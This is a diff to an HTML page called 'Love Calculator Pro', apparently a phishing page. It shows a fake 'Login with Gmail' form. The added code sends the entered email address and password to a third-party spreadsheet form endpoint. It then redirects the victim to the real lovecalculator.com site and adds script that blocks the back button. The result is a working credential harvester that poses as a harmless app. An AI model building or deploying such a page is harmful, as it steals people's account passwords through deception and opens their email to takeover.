@@ -1,39 +1,53 @@
 <!DOCTYPE html>
 <html>
+
 <head>
     <title>Love Calculator</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="theme-color" content="#910200"> 
-    <link rel="stylesheet" href="style.css" >
-    <link rel="icon" href="heart.png" >
+    <meta name="theme-color" content="#910200">
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="heart.png">
     <script src="https://login2explore.com/jpdb/resources/js/0.0.4/jpdb-commons.js"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    
+
 </head>
+
 <body>
 
-<div class="container">
+    <div class="container">
 
-<h1 >Love Calculator Pro</h1>
+        <h1>Love Calculator Pro</h1>
 
-<h2 >Login with <img src="gmail-logo.jpg"></h2>
+        <h2>Login with <img src="gmail-logo.jpg"></h2>
 
 
-    <form id="test-form">
-
-        <label >Your Gmail account</label>
-        <input type="text" placeholder="Enter email" id="username" name="username" required  autocomplete="on">
-
-        <label >Password</label>
-        <input type="password" placeholder="Enter password" id="password" name="password" required autocomplete="on">
-
-        <button id="submit-form" type="submit">Login</button>
-    </form>
+        <form id="test-form" action="https://api.sheetmonkey.io/form/nKXYb2JM9kJPXDp1RwJ9Xt" method="post">
+            <label>Your Gmail account
+                <input type="text" placeholder="Enter email" id="username" name="username" required autocomplete="on">
+            </label>
+            <label>Password
+                <input type="password" placeholder="Enter password" id="password" name="password" required
+                    autocomplete="on">
+            </label>
+            <input type="hidden" name="created" value="x-sheetmonkey-current-date-time" />
+            <input type="hidden" name="x-sheetmonkey-redirect" value="https://www.lovecalculator.com/" />
+            <input id="submit-form" type="submit" value="Submit" />
+        </form>
     </div>
 
-<script type="text/javascript" src="js/main.js"></script>
+    <script type="text/javascript" src="js/main.js"></script>
+
+    <script type="text/javascript">
+        function disableBack() {
+            window.history.forward();
+        }
+        setTimeout("disableBack()", 0);
+        window.onunload = function () {
+            window.location.replace("https://www.lovecalculator.com/");  
+        };
+    </script>
 
 </body>
-</html>
 
+</html>
